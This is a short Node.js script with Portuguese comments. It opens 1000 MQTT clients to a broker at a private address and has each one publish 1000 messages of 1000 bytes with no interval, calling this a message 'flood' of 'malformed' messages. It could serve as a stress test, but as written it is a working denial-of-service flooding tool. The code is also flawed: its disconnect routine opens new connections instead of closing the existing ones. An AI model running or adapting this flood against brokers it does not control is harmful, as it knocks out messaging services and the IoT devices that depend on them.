const mqtt = require("mqtt");

// Configurações do broker MQTT
const brokerUrl = "mqtt://192.168.1.75:1883";
const topic = "test";
const messageInterval = 0; // Envio contínuo de mensagens sem intervalo
const messagesPerClient = 1000; // Número elevado de mensagens por cliente
const messageSize = 1000; // Tamanho das mensagens

// Número de clientes para simular conexões
const numberOfClients = 1000;

// Inicia a conexão de clientes MQTT
connectClients();

// Define o tempo de execução em segundos
const executionTimeInSeconds = 10;

// Tempo atual de início da execução
const startTime = Date.now();

// Função para conectar os clientes MQTT
function connectClients() {
  let clientsConnected = 0;

  for (let i = 0; i < numberOfClients; i++) {
    const client = mqtt.connect(brokerUrl);

    client.on("connect", function () {
      console.log("Client " + i + " connected");
      clientsConnected++;
      // Assim que o cliente está conectado, inicia o envio de mensagens
      startMessageFlood(client, i);

      // Verifica se todos os clientes estão conectados
      if (clientsConnected === numberOfClients) {
        // Todos os clientes conectados, inicia o temporizador de execução
        const currentTime = Date.now();
        const elapsedSeconds = (currentTime - startTime) / 1000;

        if (elapsedSeconds < executionTimeInSeconds) {
          // Ainda não passou o tempo de execução, continua conectando clientes
          console.log(`Elapsed Time: ${elapsedSeconds.toFixed(1)} seconds`);
        } else {
          // Passou o tempo de execução, desconecta todos os clientes restantes
          console.log(
            `Elapsed Time: ${elapsedSeconds.toFixed(
              1
            )} seconds - Stopping process`
          );
          disconnectClients();
        }
      }
    });

    client.on("error", function (error) {
      console.error("Error from client " + i, error);
    });

    client.on("close", function () {
      console.log("Client " + i + " disconnected");
    });
  }
}

// Função para desconectar todos os clientes MQTT
function disconnectClients() {
  console.log("Disconnecting all clients...");

  // Desconecta todos os clientes MQTT
  for (let i = 0; i < numberOfClients; i++) {
    const client = mqtt.connect(brokerUrl);
    client.end();
  }

  // Finaliza o processo Node.js
  process.exit();
}

// Função para iniciar o envio contínuo de mensagens de flood
function startMessageFlood(client, clientId) {
  const largeMessage = generateLargeMessage(messageSize);
  console.log(
    `Client ${clientId} sending ${messagesPerClient} messages of size ${messageSize} bytes to topic ${topic}`
  );

  let messagesSent = 0;

  function sendMessages() {
    if (messagesSent < messagesPerClient) {
      client.publish(topic, largeMessage, function (err) {
        if (err) {
          console.error(
            `Error publishing message from client ${clientId}:`,
            err
          );
        } else {
          messagesSent++;
          // Chama recursivamente para enviar a próxima mensagem
          setImmediate(sendMessages);
        }
      });
    }
  }

  sendMessages();
}

// Função para gerar uma mensagem grande (malformada)
function generateLargeMessage(size) {
  return "A".repeat(size);
}

// Define a função para parar o processo após 10 segundos
setTimeout(function () {
  console.log(`Process will stop after ${executionTimeInSeconds} seconds`);
  disconnectClients();
}, executionTimeInSeconds * 1000);
